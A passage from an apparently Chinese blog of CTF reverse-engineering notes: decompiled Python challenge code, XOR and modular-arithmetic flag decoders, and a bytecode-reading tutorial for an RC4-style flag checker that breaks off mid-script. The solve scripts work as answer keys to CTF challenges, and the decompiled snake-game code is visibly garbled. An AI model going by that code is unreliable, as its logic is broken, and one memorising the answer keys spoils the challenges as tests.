pos[1]:<br>                            pos = (0, 1)<br>                            b = False<br>                            continue<br>                            if not (event.key in (K_a, K_LEFT) or b) and pos[0]:<br>                                pos = (-1, 0)<br>                                b = False<br>                                continue<br>                                if not event.key in (K_d, K_RIGHT) and b and pos[0]:<br>                                    pos = (1, 0)<br>                                    b = False<br>                                screen.fill(BGCOLOR)<br>                                for x in range(SIZE, SCREEN_WIDTH, SIZE):<br>                                    pygame.draw.line(screen, BLACK, (x, SCOPE_Y[0] * SIZE), (x, SCREEN_HEIGHT),<br>                                                     LINE_WIDTH)<br><br>        for y in range(SCOPE_Y[0] * SIZE, SCREEN_HEIGHT, SIZE):<br>            pygame.draw.line(screen, BLACK, (0, y), (SCREEN_WIDTH, y), LINE_WIDTH)<br><br>        if not game_over:<br>            curTime = time.time()<br>            if not curTime - last_move_time &gt; speed and pause:<br>                b = True<br>                last_move_time = curTime<br>                next_s = (snake[0][0] + pos[0], snake[0][1] + pos[1])<br>                if next_s == food:<br>                    snake.appendleft(next_s)<br>                    score += food_style[0]<br>                    speed = orispeed - 0.03 * (score // 100)<br>                    food = create_food(snake)<br>                    food_style = get_food_style()<br>                elif next_s[0] &lt;= next_s[0] or next_s[0] &lt;= SCOPE_X[1]:<br>                    pass<br>                else:<br>                    SCOPE_X[0]<br>            elif next_s[1] &lt;= next_s[1] or next_s[1] &lt;= SCOPE_Y[1]:<br>                pass<br>            else:<br>                SCOPE_Y[0]<br>        elif next_s not in snake:<br>            snake.appendleft(next_s)<br>            snake.pop()<br>        else:<br>            game_over = True<br>        if not game_over:<br>            pygame.draw.rect(screen, food_style[1], (food[0] * SIZE, food[1] * SIZE, SIZE, SIZE), 0)<br>        for s in snake:<br>            pygame.draw.rect(screen, DARK, (<br>            s[0] * SIZE + LINE_WIDTH, s[1] * SIZE + LINE_WIDTH, SIZE - LINE_WIDTH * 2, SIZE - LINE_WIDTH * 2), 0)<br><br>        print_text(screen, font1, 450, 7, f&#x27;&#x27;&#x27;得分: &#123;score&#125;&#x27;&#x27;&#x27;)<br>        if score &gt; 1000:<br>            flag = [ 30, 196, 52, 252, 49, 220, 7, 243, 3, 241, 24, 224, 40, 230, 25, 251, 28, 233, 40, 237, 4, 225, 4, 215, 40, 231, 22, 237, 14, 251, 10, 169]<br>            for i in range(0, len(flag), 2):<br>                flag[i] = flag[i + 1] ^ 136<br>                flag[i + 1] = flag[i] ^ 119<br><br>            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2,<br>                       bytes(flag).decode(), RED)<br>            pygame.display.update()<br>        if game_over and start:<br>            print_text(screen, font2, (SCREEN_WIDTH - fwidth) // 2, (SCREEN_HEIGHT - fheight) // 2, &#x27;GAME OVER&#x27;, RED)<br>        pygame.display.update()<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br></code></pre></td></tr></table></figure><p>看到flag代码提取出来，注意这里要同时异或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">flag = [ 30, 196, 52, 252, 49, 220, 7, 243, 3, 241, 24, 224, 40, 230, 25, 251, 28, 233, 40, 237, 4, 225, 4, 215, 40, 231, 22, 237, 14, 251, 10, 169]<br>for i in range(0, len(flag), 2):<br>        flag[i],flag[i+1]= flag[i + 1] ^ 136,flag[i]^119<br>for i in range(len(flag)):<br>    print(chr(flag[i]),end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><h1 id="3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译"><a href="#3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译" class="headerlink" title="3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译"></a>3、如果python版本不一样，那么反编译出来的py就不一样，所以得在线网站反编译</h1><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721446247641-c20b0ad8-b4b2-42fa-af99-e5284d71cba4-293800.png" alt="1721446247641-c20b0ad8-b4b2-42fa-af99-e5284d71cba4.png"></p><h3 id="可以用在线网站查看python文件的版本"><a href="#可以用在线网站查看python文件的版本" class="headerlink" title="可以用在线网站查看python文件的版本"></a>可以用在线网站查看python文件的版本</h3><p><img src="/./img/49277317_ZWCMkHNA8_Mz7yIn/1721446520216-98c3e501-afdb-4bd4-a1e6-b90347021486-961429.png" alt="1721446520216-98c3e501-afdb-4bd4-a1e6-b90347021486.png"></p><h3 id="3-10-9的python反编译2-7的py就会出错的"><a href="#3-10-9的python反编译2-7的py就会出错的" class="headerlink" title="3.10.9的python反编译2.7的py就会出错的"></a>3.10.9的python反编译2.7的py就会出错的</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain"># uncompyle6 version 3.9.1<br># Python bytecode version base 2.7 (62211)<br># Decompiled from: Python 3.10.9 | packaged by Anaconda, Inc. | (main, Mar  1 2023, 18:18:15) [MSC v.1916 64 bit (AMD64)]<br># Embedded file name: encode.py<br># Compiled at: 2019-08-19 21:01:57<br>print &#x27;Welcome to Re World!&#x27;<br>print &#x27;Your input1 is your flag~&#x27;<br>l = len(input1)<br>for i in range(l):<br>    num = ((input1[i] + i) % 128 + 128) % 128<br>    code += num<br><br>for i in range(l - 1):<br>    code[i] = code[i] ^ code[i + 1]<br><br>print code<br>code = [4, 5, 6, 7, 8, 9, 10, 11, 12, 9, 13, 14, 15, 16, 17, 18, 19, 20, <br> 10, 21, 22, 23, 24]<br><br># okay decompiling encode.pyc<br></code></pre></td></tr></table></figure><p>这是在线网站编译出来的正确文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs plain">#!/usr/bin/env python<br># visit https://tool.lu/pyc/ for more information<br># Version: Python 2.7<br><br>print &#x27;Welcome to Re World!&#x27;<br>print &#x27;Your input1 is your flag~&#x27;<br>l = len(input1)<br>for i in range(l):<br>    num = ((input1[i] + i) % 128 + 128) % 128<br>    code += num<br><br>for i in range(l - 1):<br>    code[i] = code[i] ^ code[i + 1]<br><br>print code<br>code = [<br>    &#x27;%1f&#x27;,<br>    &#x27;%12&#x27;,<br>    &#x27;%1d&#x27;,<br>    &#x27;(&#x27;,<br>    &#x27;0&#x27;,<br>    &#x27;4&#x27;,<br>    &#x27;%01&#x27;,<br>    &#x27;%06&#x27;,<br>    &#x27;%14&#x27;,<br>    &#x27;4&#x27;,<br>    &#x27;,&#x27;,<br>    &#x27;%1b&#x27;,<br>    &#x27;U&#x27;,<br>    &#x27;?&#x27;,<br>    &#x27;o&#x27;,<br>    &#x27;6&#x27;,<br>    &#x27;*&#x27;,<br>    &#x27;:&#x27;,<br>    &#x27;%01&#x27;,<br>    &#x27;D&#x27;,<br>    &#x27;;&#x27;,<br>    &#x27;%&#x27;,<br>    &#x27;%13&#x27;]<br></code></pre></td></tr></table></figure><p><font style="color:#DF2A3F;">附上re代码，</font></p><h3 id="取余考查过很多次了记录一下，要保证在字符的范围内"><a href="#取余考查过很多次了记录一下，要保证在字符的范围内" class="headerlink" title="取余考查过很多次了记录一下，要保证在字符的范围内"></a><font style="color:#DF2A3F;">取余考查过很多次了记录一下，要保证在字符的范围内</font></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plain">code = [&#x27;\x1f&#x27;, &#x27;\x12&#x27;, &#x27;\x1d&#x27;, &#x27;(&#x27;, &#x27;0&#x27;, &#x27;4&#x27;, &#x27;\x01&#x27;, &#x27;\x06&#x27;, &#x27;\x14&#x27;, &#x27;4&#x27;, &#x27;,&#x27;, &#x27;\x1b&#x27;, &#x27;U&#x27;, &#x27;?&#x27;, &#x27;o&#x27;, &#x27;6&#x27;, &#x27;*&#x27;, &#x27;:&#x27;, &#x27;\x01&#x27;, &#x27;D&#x27;, &#x27;;&#x27;, &#x27;%&#x27;, &#x27;\x13&#x27;]<br><br>code = [ord(i)for(i)in(code)]<br>flag=&#x27;&#x27;<br>l=len(code)<br>print(l)<br>for x in range(l-2,-1,-1):<br>    code[x]=code[x]^code[x+1]<br>for i in range(l):<br>   for j in range(5):<br>       num=code[i]+j*128-i<br>       if num&gt;=33 and num&lt;=127:<br>           flag+=chr(num)<br>           break<br>print(flag)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-11-02 15:25:25<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/tyngvzcc3yr2xobu">https://www.yuque.com/chaye-apqbl/vsc85q/tyngvzcc3yr2xobu</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E5%AD%97%E8%8A%82%E7%A0%81%E9%80%86%E5%90%91/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E5%AD%97%E8%8A%82%E7%A0%81%E9%80%86%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="python字节码逆向"><a href="#python字节码逆向" class="headerlink" title="python字节码逆向"></a>python字节码逆向</h1><p><a href="https://www.cnblogs.com/nLesxw/p/python_bytecode.html">从一道CTF题学习python字节码到源码逆向 - nLesxw - 博客园</a></p><h1 id="前文"><a href="#前文" class="headerlink" title="前文"></a>前文</h1><p><font style="color:rgb(35, 38, 59);">先了解python的字节码结构，如下：</font></p><p><font style="color:rgb(0, 0, 0);">源码行号 | 指令在函数中的偏移 | 指令符号 | 指令参数 | 实际参数值</font></p><p><font style="color:rgb(35, 38, 59);">第一个为源码行号，从上述题目中我们可以了解到，本题只有5行源码，但是只给了从第3行开始的字节码</font></p><p><font style="color:rgb(35, 38, 59);">第二个指令在函数中的偏移和第四个指令参数对于做题来说不是太过重要，我们在做题的时候主要还是看指令符号和实际参数值</font></p><p><font style="color:rgb(35, 38, 59);">在第3行的字节码指令符号中，有LOAD_CONST ，BUILD_LIST ，STORE_FAST 三种类型</font></p><p><font style="color:rgb(35, 38, 59);">LOAD_CONST 加载常量，通常为整数值</font></p><p><font style="color:rgb(35, 38, 59);">BUILD_LIST 创建一个列表</font></p><p><font style="color:rgb(35, 38, 59);">STORE_FAST 一般用于保存值到局部变量</font></p><p><font style="color:rgb(35, 38, 59);">SETUP_LOOP，用于开始循环，括号里的189表示循环退出点（字节码结构中的第二个指令在函数中偏移）</font></p><p><font style="color:rgb(35, 38, 59);">LOAD_GLOBAL，用来加载全局变量，包括指定函数名，类名，模块名等全局符号</font></p><p><font style="color:rgb(35, 38, 59);">CALL_FUNCTION，用来表示前面加载全局变量的参数个数</font></p><p><font style="color:rgb(35, 38, 59);">GET_ITER，FOR_ITER ，获取参数，开始迭代。这两个不需要过多理解，属于for-in结构特有的，它们通常同时出现。</font></p><p><font style="color:rgb(35, 38, 59);">BINARY_SUBSCR ，读取迭代器中某个下标的值</font></p><p><font style="color:rgb(35, 38, 59);">BINARY_RSHIFT，进行右移运算</font></p><p><font style="color:rgb(35, 38, 59);">BINARY_LSHIFT ，左移运算</font></p><p><font style="color:rgb(35, 38, 59);">BINARY_OR，或运算</font></p><p><font style="color:rgb(35, 38, 59);">BINARY_AND ，与运算</font></p><p><font style="color:rgb(35, 38, 59);">STORE_SUBSCR ，修改迭代器中某个下标的值</font></p><p><font style="color:rgb(35, 38, 59);">JUMP_ABSOLUTE ，回到循环起点</font></p><p><font style="color:rgb(35, 38, 59);">RETURN_VALUE  ，函数结束标志</font></p><p><font style="color:rgb(35, 38, 59);">POP_BLOCK，特有的，不用特别理解，对转换回源码不重要，通常和LOAD_CONST               0 (None)一起出现。</font></p><p><font style="color:rgb(35, 38, 59);"></font></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a><font style="color:rgb(35, 38, 59);">例题</font></h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br></pre></td><td class="code"><pre><code class="hljs plain">ezRe (Python 3.9)<br>[Code]<br>    File Name: flag_checker.py<br>    Object Name: &lt;module&gt;<br>    Arg Count: 0<br>    Pos Only Arg Count: 0<br>    KW Only Arg Count: 0<br>    Locals: 0<br>    Stack Size: 7<br>    Flags: 0x00000040 (CO_NOFREE)<br>    [Names]<br>        &#x27;base64&#x27;<br>        &#x27;input&#x27;<br>        &#x27;text&#x27;<br>        &#x27;key&#x27;<br>        &#x27;list&#x27;<br>        &#x27;range&#x27;<br>        &#x27;s&#x27;<br>        &#x27;j&#x27;<br>        &#x27;i&#x27;<br>        &#x27;len&#x27;<br>        &#x27;data&#x27;<br>        &#x27;_&#x27;<br>        &#x27;append&#x27;<br>        &#x27;result&#x27;<br>        &#x27;zip&#x27;<br>        &#x27;c&#x27;<br>        &#x27;k&#x27;<br>        &#x27;chr&#x27;<br>        &#x27;ord&#x27;<br>        &#x27;b64encode&#x27;<br>        &#x27;encode&#x27;<br>        &#x27;decode&#x27;<br>        &#x27;enc&#x27;<br>        &#x27;print&#x27;<br>    [Var Names]<br>    [Free Vars]<br>    [Cell Vars]<br>    [Constants]<br>        0<br>        None<br>        &#x27;Flag: &#x27;<br>        &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        [Code]<br>            File Name: flag_checker.py<br>            Object Name: &lt;listcomp&gt;<br>            Arg Count: 1<br>            Pos Only Arg Count: 0<br>            KW Only Arg Count: 0<br>            Locals: 2<br>            Stack Size: 4<br>            Flags: 0x00000043 (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)<br>            [Names]<br>                &#x27;ord&#x27;<br>            [Var Names]<br>                &#x27;.0&#x27;<br>                &#x27;i&#x27;<br>            [Free Vars]<br>            [Cell Vars]<br>            [Constants]<br>                102<br>            [Disassembly]<br>                0       BUILD_LIST                      0<br>                2       LOAD_FAST                       0: .0<br>                4       FOR_ITER                        16 (to 22)<br>                6       STORE_FAST                      1: i<br>                8       LOAD_GLOBAL                     0: ord<br>                10      LOAD_FAST                       1: i<br>                12      CALL_FUNCTION                   1<br>                14      LOAD_CONST                      0: 102<br>                16      BINARY_XOR                      <br>                18      LIST_APPEND                     2<br>                20      JUMP_ABSOLUTE                   4<br>                22      RETURN_VALUE                    <br>        &#x27;&lt;listcomp&gt;&#x27;<br>        256<br>        50<br>        1<br>        &#x27;&#x27;<br>        51<br>        &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        &#x27;yes!&#x27;<br>        &#x27;try again...&#x27;<br>    [Disassembly]<br>        0       LOAD_CONST                      0: 0<br>        2       LOAD_CONST                      1: None<br>        4       JUMP_FORWARD                    0 (to 6)<br>        6       JUMP_FORWARD                    0 (to 8)<br>        8       JUMP_FORWARD                    0 (to 10)<br>        10      IMPORT_NAME                     0: base64<br>        12      STORE_NAME                      0: base64<br>        14      LOAD_NAME                       1: input<br>        16      LOAD_CONST                      2: &#x27;Flag: &#x27;<br>        18      CALL_FUNCTION                   1<br>        20      STORE_NAME                      2: text<br>        22      LOAD_CONST                      3: &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>        24      STORE_NAME                      3: key<br>        26      LOAD_CONST                      4: &lt;CODE&gt; &lt;listcomp&gt;<br>        28      LOAD_CONST                      5: &#x27;&lt;listcomp&gt;&#x27;<br>        30      MAKE_FUNCTION                   0<br>        32      LOAD_NAME                       3: key<br>        34      GET_ITER                        <br>        36      CALL_FUNCTION                   1<br>        38      STORE_NAME                      3: key<br>        40      LOAD_NAME                       4: list<br>        42      LOAD_NAME                       5: range<br>        44      LOAD_CONST                      6: 256<br>        46      CALL_FUNCTION                   1<br>        48      CALL_FUNCTION                   1<br>        50      STORE_NAME                      6: s<br>        52      LOAD_CONST                      0: 0<br>        54      STORE_NAME                      7: j<br>        56      LOAD_NAME                       5: range<br>        58      LOAD_CONST                      6: 256<br>        60      CALL_FUNCTION                   1<br>        62      GET_ITER                        <br>        64      FOR_ITER                        62 (to 128)<br>        66      STORE_NAME                      8: i<br>        68      LOAD_NAME                       7: j<br>        70      LOAD_NAME                       6: s<br>        72      LOAD_NAME                       8: i<br>        74      BINARY_SUBSCR                   <br>        76      BINARY_ADD                      <br>        78      LOAD_NAME                       3: key<br>        80      LOAD_NAME                       8: i<br>        82      LOAD_NAME                       9: len<br>        84      LOAD_NAME                       3: key<br>        86      CALL_FUNCTION                   1<br>        88      BINARY_MODULO                   <br>        90      BINARY_SUBSCR                   <br>        92      BINARY_ADD                      <br>        94      LOAD_CONST                      6: 256<br>        96      BINARY_MODULO                   <br>        98      STORE_NAME                      7: j<br>        100     LOAD_NAME                       6: s<br>        102     LOAD_NAME                       7: j<br>        104     BINARY_SUBSCR                   <br>        106     LOAD_NAME                       6: s<br>        108     LOAD_NAME                       8: i<br>        110     BINARY_SUBSCR                   <br>        112     ROT_TWO                         <br>        114     LOAD_NAME                       6: s<br>        116     LOAD_NAME                       8: i<br>        118     STORE_SUBSCR                    <br>        120     LOAD_NAME                       6: s<br>        122     LOAD_NAME                       7: j<br>        124     STORE_SUBSCR                    <br>        126     JUMP_ABSOLUTE                   64<br>        128     LOAD_CONST                      0: 0<br>        130     DUP_TOP                         <br>        132     STORE_NAME                      8: i<br>        134     STORE_NAME                      7: j<br>        136     BUILD_LIST                      0<br>        138     STORE_NAME                      10: data<br>        140     LOAD_NAME                       5: range<br>        142     LOAD_CONST                      7: 50<br>        144     CALL_FUNCTION                   1<br>        146     GET_ITER                        <br>        148     FOR_ITER                        88 (to 238)<br>        150     STORE_NAME                      11: _<br>        152     LOAD_NAME                       8: i<br>        154     LOAD_CONST                      8: 1<br>        156     BINARY_ADD                      <br>        158     LOAD_CONST                      6: 256<br>        160     BINARY_MODULO                   <br>        162     STORE_NAME                      8: i<br>        164     LOAD_NAME                       7: j<br>        166     LOAD_NAME                       6: s<br>        168     LOAD_NAME                       8: i<br>        170     BINARY_SUBSCR                   <br>        172     BINARY_ADD                      <br>        174     LOAD_CONST                      6: 256<br>        176     BINARY_MODULO                   <br>        178     STORE_NAME                      7: j<br>        180     LOAD_NAME                       6: s<br>        182     LOAD_NAME                       7: j<br>        184     BINARY_SUBSCR                   <br>        186     LOAD_NAME                       6: s<br>        188     LOAD_NAME                       8: i<br>        190     BINARY_SUBSCR                   <br>        192     ROT_TWO                         <br>        194     LOAD_NAME                       6: s<br>        196     LOAD_NAME                       8: i<br>        198     STORE_SUBSCR                    <br>        200     LOAD_NAME                       6: s<br>        202     LOAD_NAME                       7: j<br>        204     STORE_SUBSCR                    <br>        206     LOAD_NAME                       10: data<br>        208     LOAD_METHOD                     12: append<br>        210     LOAD_NAME                       6: s<br>        212     LOAD_NAME                       6: s<br>        214     LOAD_NAME                       8: i<br>        216     BINARY_SUBSCR                   <br>        218     LOAD_NAME                       6: s<br>        220     LOAD_NAME                       7: j<br>        222     BINARY_SUBSCR                   <br>        224     BINARY_ADD                      <br>        226     LOAD_CONST                      6: 256<br>        228     BINARY_MODULO                   <br>        230     BINARY_SUBSCR                   <br>        232     CALL_METHOD                     1<br>        234     POP_TOP                         <br>        236     JUMP_ABSOLUTE                   148<br>        238     LOAD_CONST                      9: &#x27;&#x27;<br>        240     STORE_NAME                      13: result<br>        242     LOAD_NAME                       14: zip<br>        244     LOAD_NAME                       2: text<br>        246     LOAD_NAME                       10: data<br>        248     CALL_FUNCTION                   2<br>        250     GET_ITER                        <br>        252     FOR_ITER                        32 (to 286)<br>        254     UNPACK_SEQUENCE                 2<br>        256     STORE_NAME                      15: c<br>        258     STORE_NAME                      16: k<br>        260     LOAD_NAME                       13: result<br>        262     LOAD_NAME                       17: chr<br>        264     LOAD_NAME                       18: ord<br>        266     LOAD_NAME                       15: c<br>        268     CALL_FUNCTION                   1<br>        270     LOAD_NAME                       16: k<br>        272     BINARY_XOR                      <br>        274     LOAD_CONST                      10: 51<br>        276     BINARY_XOR                      <br>        278     CALL_FUNCTION                   1<br>        280     INPLACE_ADD                     <br>        282     STORE_NAME                      13: result<br>        284     JUMP_ABSOLUTE                   252<br>        286     LOAD_NAME                       0: base64<br>        288     LOAD_METHOD                     19: b64encode<br>        290     LOAD_NAME                       13: result<br>        292     LOAD_METHOD                     20: encode<br>        294     CALL_METHOD                     0<br>        296     CALL_METHOD                     1<br>        298     LOAD_METHOD                     21: decode<br>        300     CALL_METHOD                     0<br>        302     STORE_NAME                      22: enc<br>        304     LOAD_NAME                       22: enc<br>        306     LOAD_CONST                      11: &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br>        308     COMPARE_OP                      2 (==)<br>        310     POP_JUMP_IF_FALSE               324<br>        314     LOAD_NAME                       23: print<br>        316     LOAD_CONST                      12: &#x27;yes!&#x27;<br>        318     CALL_FUNCTION                   1<br>        320     POP_TOP                         <br>        322     JUMP_FORWARD                    8 (to 332)<br>        324     LOAD_NAME                       23: print<br>        326     LOAD_CONST                      13: &#x27;try again...&#x27;<br>        328     CALL_FUNCTION                   1<br>        330     POP_TOP                         <br>        332     LOAD_CONST                      1: None<br>        334     RETURN_VALUE<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plain">import base64<br><br># 原始密钥和加密的目标输出<br>key = &#x27;7e021a7dd49e4bd0837e22129682551b&#x27;<br>encoded_target = &#x27;w53Cj3HDgzTCsSM5wrg6FMKcw58Qw7RZSFLCljRxwrxbwrVdw4AEwqMjw7/DkMKTw4/Cv8Onw4NGw7jDmSdcwq4GGg==&#x27;<br><br># 